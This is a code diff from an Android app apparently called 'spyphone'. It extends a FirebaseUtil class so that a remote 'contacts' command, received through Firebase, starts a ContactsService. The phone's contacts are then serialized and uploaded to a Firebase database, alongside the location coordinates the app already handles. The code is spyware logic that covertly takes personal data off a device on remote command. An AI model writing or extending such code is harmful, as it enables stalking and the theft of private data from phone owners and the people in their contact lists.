@@ -18,6 +18,7 @@ import java.util.HashMap;
 import java.util.Map;
 
 import emit.esy.es.spyphone.R;
+import emit.esy.es.spyphone.services.ContactsService;
 import emit.esy.es.spyphone.services.LocationService;
 
 /**
@@ -105,6 +106,9 @@ public class FirebaseUtil {
             case "cords":
                 content = data.getDoubleArray("content");
                 break;
+            case "contacts":
+                content = data.getSerializable("content");
+                break;
         }
         aw.put("content", content);
         uploadRef.setValue(aw);
@@ -158,6 +162,9 @@ public class FirebaseUtil {
                                     break;
                                 case "contacts":
                                     Log.d(LOG_TAG, "Starting contacts service");
+                                    intent = new Intent(context, ContactsService.class);
+                                    intent.putExtra("messenger", new Messenger(handler));
+                                    context.startService(intent);
                                     setOnDefaultAndroidRead(dataSnapshot);
                                     break;
                                 default:
